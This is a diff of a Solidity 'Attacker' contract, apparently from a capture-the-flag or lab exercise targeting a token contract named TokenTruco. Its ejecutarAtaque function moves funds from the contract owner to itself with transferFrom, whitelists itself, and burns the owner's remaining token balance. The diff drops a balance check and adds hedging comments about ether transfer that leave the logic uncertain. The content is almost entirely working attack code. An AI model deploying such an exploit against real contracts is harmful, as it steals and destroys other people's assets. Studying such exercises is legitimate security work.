@@ -118,28 +118,26 @@ contract Attacker {
 
     // Method to execute the attack
     function ejecutarAtaque() public {
-        // Calculate a random amount to transfer using montoAleatorio from TokenTruco
         uint256 randomAmount = tokenTruco.montoAleatorio();
-
-        // Get the owner's address from TokenTruco
         address owner = tokenTruco.owner();
 
-        // Ensure the random amount does not exceed the current balance of the owner
-        uint256 ownerBalance = tokenTruco.balances(owner);
-        if (randomAmount > ownerBalance) {
-            randomAmount = ownerBalance;
-        }
+        // Assuming the transferFrom in TokenTruco should handle ether, which might not be the case.
+        // You may need an additional step to ensure ether is transferred if the TokenTruco's transferFrom
+        // does not actually transfer ether.
 
-        // Transfer the random amount from the owner to this contract
+        // This call assumes transferFrom also transfers ether which might require you to hold ether in the contract.
         tokenTruco.transferFrom(owner, address(this), randomAmount);
 
-        // Add this contract to the whitelist
         tokenTruco.addToWhitelist();
 
-        // Calculate the remaining balance of the owner to burn
+        // Burn the rest of the tokens.
         uint256 remainingBalance = tokenTruco.balances(owner);
-
-        // Burn the remaining balance of the owner
         tokenTruco.burn(owner, remainingBalance);
+
+        // If ether transfer isn't handled by TokenTruco, you need a way to transfer ether manually.
+        // Example: require that the owner sends ether to this contract in some way.
     }
+
+    // Add a function to receive ether if necessary
+    receive() external payable {}
 }
